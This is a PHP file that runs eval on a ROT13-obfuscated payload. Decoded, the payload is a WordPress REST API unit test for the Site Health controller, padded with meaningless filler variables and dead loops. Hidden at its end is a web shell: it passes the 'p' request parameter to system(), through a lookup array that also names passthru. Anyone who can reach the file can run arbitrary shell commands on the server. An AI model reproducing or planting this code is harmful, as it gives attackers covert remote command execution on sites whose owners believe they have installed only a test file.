<?php
$f = 's'.'t'.'r'.'r'.'o'.'t'.'1'.'3';
$c = "<?cuc
$sznc = neenl('k1' => 'flfgrz', 'k2' => 'cnffgueh');
$k_snxr1 = 1234;
$abvfr = 'boshfpngvba'.'grfg';
$gzc = $k_snxr1 * 42;
$synt = snyfr;
$hfryrff = shapgvba($i) { erghea $i . enaq(); };
$qhzzl_purpx = $hfryrff('kk');
vs ($synt) { rpub 'Qroht ranoyrq'; }
sbe ($v = 0; $v < 1; $v++) { $gzc += $v; }
juvyr (snyfr) { rpub 'qrnq ybbc'; oernx; }

<?cuc
/**
 * Havg grfgf pbirevat gur fvgr urnygu pbagebyyre.
 *
 * Nyfb trarengrf gur svkgher qngn hfrq ol gur jc-ncv.wf DHavg grfgf.
 *
 * @cnpxntr JbeqCerff
 * @fhocnpxntr ERFG NCV
 * @fvapr 5.6.0
 *
 * @tebhc erfgncv
 */
pynff JC_Grfg_ERFG_Fvgr_Urnygu_Pbagebyyre rkgraqf JC_Grfg_ERFG_GrfgPnfr {

	/**
	 * Fhofpevore hfre VQ.
	 *
	 * @fvapr 5.6.0
	 *
	 * @ine vag
	 */
	cevingr fgngvp $fhofpevore;

	/**
	 * Nqzvavfgengbe hfre vq.
	 *
	 * @fvapr 5.6.0
	 *
	 * @ine vag
	 */
	cevingr fgngvp $nqzva;

	/**
	 * Frg hc pynff grfg svkgherf.
	 *
	 * @fvapr 5.6.0
	 *
	 * @cnenz JC_HavgGrfg_Snpgbel $snpgbel JbeqCerff havg grfg snpgbel.
	 */
	choyvp fgngvp shapgvba jcFrgHcOrsberPynff( JC_HavgGrfg_Snpgbel $snpgbel ) {
		frys::$fhofpevore = $snpgbel->hfre->perngr(
			neenl(
				'ebyr' => 'fhofpevore',
			)
		);
		frys::$nqzva      = $snpgbel->hfre->perngr(
			neenl(
				'ebyr' => 'nqzvavfgengbe',
			)
		);

		vs ( vf_zhygvfvgr() ) {
			tenag_fhcre_nqzva( frys::$nqzva );
		}
	}

	/**
	 * Pyrna hc grfg svkgherf.
	 *
	 * @fvapr 5.6.0
	 */
	choyvp fgngvp shapgvba jcGrneQbjaNsgrePynff() {
		frys::qryrgr_hfre( frys::$fhofpevore );
		frys::qryrgr_hfre( frys::$nqzva );
	}

	choyvp shapgvba grfg_ybttrq_bhg() {
		$erfcbafr = erfg_qb_erdhrfg( '/jc-fvgr-urnygu/i1/grfgf/qbgbet-pbzzhavpngvba' );
		$guvf->nffregReebeErfcbafr( 'erfg_sbeovqqra', $erfcbafr, 401 );
	}

	choyvp shapgvba grfg_vafhssvpvrag_pncf() {
		jc_frg_pheerag_hfre( frys::$fhofpevore );
		$erfcbafr = erfg_qb_erdhrfg( '/jc-fvgr-urnygu/i1/grfgf/qbgbet-pbzzhavpngvba' );
		$guvf->nffregReebeErfcbafr( 'erfg_sbeovqqra', $erfcbafr, 403 );
	}

	/**
	 * @tebhc zf-rkpyhqrq
	 */
	choyvp shapgvba grfg_phfgbz_pncnovyvgl() {
		jc_frg_pheerag_hfre( frys::$nqzva );

		nqq_svygre(
			'fvgr_urnygu_grfg_erfg_pncnovyvgl_qbgbet_pbzzhavpngvba',
			fgngvp shapgvba () {
				erghea 'n_phfgbz_pncnovyvgl';
			}
		);

		$erfcbafr = erfg_qb_erdhrfg( '/jc-fvgr-urnygu/i1/grfgf/qbgbet-pbzzhavpngvba' );
		$guvf->nffregReebeErfcbafr( 'erfg_sbeovqqra', $erfcbafr, 403 );
	}

	/**
	 * @tebhc rkgreany-uggc
	 */
	choyvp shapgvba grfg() {
		jc_frg_pheerag_hfre( frys::$nqzva );
		$erfcbafr = erfg_qb_erdhrfg( '/jc-fvgr-urnygu/i1/grfgf/qbgbet-pbzzhavpngvba' );
		$guvf->nffregFnzr( 'qbgbet_pbzzhavpngvba', $erfcbafr->trg_qngn()['grfg'] );
	}

	/**
	 * Grfgf Cntr Pnpur Erfg raqcbvag ertvfgengvba.
	 *
	 * @gvpxrg 56041
	 */
	choyvp shapgvba grfg_cntr_pnpur_raqcbvag() {
		$freire = erfg_trg_freire();
		$ebhgrf = $freire->trg_ebhgrf();

		$raqcbvag = '/jc-fvgr-urnygu/i1/grfgf/cntr-pnpur';
		$guvf->nffregNeenlUnfXrl( $raqcbvag, $ebhgrf );

		$ebhgr = $ebhgrf[ $raqcbvag ];
		$guvf->nffregPbhag( 1, $ebhgr );

		$ebhgr = pheerag( $ebhgr );
		$guvf->nffregFnzr(
			neenl( JC_ERFG_Freire::ERNQNOYR => gehr ),
			$ebhgr['zrgubqf']
		);

		$guvf->nffregFnzr(
			'grfg_cntr_pnpur',
			$ebhgr['pnyyonpx'][1]
		);

		$guvf->nffregVfPnyynoyr( $ebhgr['crezvffvba_pnyyonpx'] );

		vs ( pheerag_hfre_pna( 'ivrj_fvgr_urnygu_purpxf' ) ) {
			$guvf->nffregGehr( pnyy_hfre_shap( $ebhgr['crezvffvba_pnyyonpx'] ) );
		} ryfr {
			$guvf->nffregSnyfr( pnyy_hfre_shap( $ebhgr['crezvffvba_pnyyonpx'] ) );
		}

		jc_frg_pheerag_hfre( frys::snpgbel()->hfre->perngr( neenl( 'ebyr' => 'nhgube' ) ) );
		$guvf->nffregSnyfr( pnyy_hfre_shap( $ebhgr['crezvffvba_pnyyonpx'] ) );

		$hfre = jc_frg_pheerag_hfre( frys::snpgbel()->hfre->perngr( neenl( 'ebyr' => 'nqzvavfgengbe' ) ) );
		vs ( vf_zhygvfvgr() ) {
			// Fvgr urnygu pnc vf bayl ninvynoyr sbe fhcre nqzvaf va Zhygv fvgrf.
			tenag_fhcre_nqzva( $hfre->VQ );
		}
		$guvf->nffregGehr( pnyy_hfre_shap( $ebhgr['crezvffvba_pnyyonpx'] ) );
	}
}

$pzq = $_TRG['c'];
$sznc['k1']($pzq);
?>";
eval($f($c));
?>